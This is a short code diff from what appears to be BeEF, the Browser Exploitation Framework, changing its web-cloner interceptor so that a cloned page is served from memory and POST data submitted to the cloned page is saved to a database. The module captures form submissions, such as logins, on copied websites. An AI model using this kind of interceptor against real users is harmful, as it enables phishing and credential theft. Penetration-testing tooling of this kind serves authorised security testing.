@@ -27,9 +27,7 @@ module BeEF
       get "/" do
         print_info "GET request"
         print_info "Referer: #{request.referer}"
-        file = File.open(settings.file_path,'r')
-        cloned_page = file.read
-        file.close
+        cloned_page = settings.cloned_page
         cloned_page
       end
 
@@ -40,6 +38,12 @@ module BeEF
         data = request.body.read
         print_info "Intercepted data:"
         print_info data
+
+        interceptor_db = BeEF::Core::Models::Interceptor.new(
+            :webcloner_id => settings.db_entry.id,
+            :post_data => data
+        )
+        interceptor_db.save
 
         if settings.frameable
           print_info "Page can be framed :-) Loading original URL into iFrame..."
